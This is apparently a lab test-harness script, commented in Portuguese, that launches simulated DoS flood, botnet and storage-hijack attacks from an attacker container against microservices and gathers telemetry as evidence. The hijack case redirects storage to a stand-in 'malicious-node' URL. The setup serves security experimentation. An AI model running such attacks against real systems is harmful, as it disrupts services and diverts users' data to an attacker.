#!/usr/bin/env bash
# uso: ./run_attack.sh <dos|botnet|hijack|normal> [run]
#   ex: ./run_attack.sh dos r1

set -uo pipefail
source "$(dirname "$0")/infra/lib.sh"

ATTACK=${1:?uso: $0 <dos|botnet|hijack|normal> [run]}
RUN=${2:-r1}
ATTACKER=attacker-pt-aveiro-dc1-r99-n99
LABEL="${ATTACK}_${RUN}"
OUT="evidencias/$LABEL"
mkdir -p "$OUT"

# Comando comum: o attacker.py recebe os URLs por variáveis de ambiente
run_attacker() {
    incus exec "$ATTACKER" -- env \
        REGISTRY_URL="http://$REGISTRY.incus:5050" \
        INGESTION_URL="http://$INGESTION.incus:5001" \
        STORAGE_URL="http://$STORAGE.incus:5002" \
        python3 /root/attacker.py "$@"
}

case "$ATTACK" in
    dos)
        CMD=(run_attacker dos-flood --requests 3000 --concurrency 30) ;;
    botnet)
        CMD=(run_attacker botnet --sensors 30 --requests-per-sensor 5) ;;
    hijack)
        CMD=(run_attacker hijack --storage-id "$STORAGE" \
                  --malicious-url http://malicious-node.incus:6666) ;;
    normal)
        CMD=(sleep 120) ;;
    *)
        echo "ataque desconhecido: $ATTACK (usa dos, botnet, hijack ou normal)"; exit 1 ;;
esac

# 1) Garantir estado limpo reiniciando os microsserviços
echo "[*] A repor estado limpo (restart dos serviços)..."
for c in "$REGISTRY" "$STORAGE" "$INGESTION"; do
    incus exec "$c" -- systemctl restart ssle
done
sleep 40

# 2) Enviar a versão mais recente do script do atacante
#echo "[*] A atualizar o script no contentor do atacante..."
#incus file push ADTree/attacker.py "$ATTACKER/root/attacker.py" >/dev/null

# 3) Executar o ataque e cronometrar
START=$(date +%s)
echo "label=$LABEL"         >  "$OUT/meta.txt"
echo "start=$(date -Is)"     >> "$OUT/meta.txt"

echo "[*] A iniciar execução do ataque: $ATTACK"
"${CMD[@]}" 2>&1 | tee "$OUT/attacker_output.txt"

END=$(date +%s)
DUR=$((END - START))
echo "end=$(date -Is)"       >> "$OUT/meta.txt"
echo "duration_s=$DUR"       >> "$OUT/meta.txt"

# 4) Aguardar o Prometheus fazer o scrape e recolher a telemetria com janela calculada
sleep 20
W=$(( DUR + 20 )); [ "$W" -lt 60 ] && W=60
echo "window_s=$W"           >> "$OUT/meta.txt"

echo "[*] A recolher telemetria e métricas pós-ataque..."
python3 monitoring/collect_baseline.py --label "$LABEL" --window "${W}s" --at "$(date +%s)" 2>/dev/null || python3 monitoring/collect_baseline.py

# Mover o relatório gerado para a pasta de evidências
if [ -f "ssle_report_$LABEL.json" ]; then
    mv "ssle_report_$LABEL.json" "$OUT/"
elif [ -f "ssle_report_baseline.json" ]; then
    mv "ssle_report_baseline.json" "$OUT/ssle_report_$LABEL.json"
fi

echo "[OK] Teste concluído com sucesso! Evidências guardadas em: $OUT"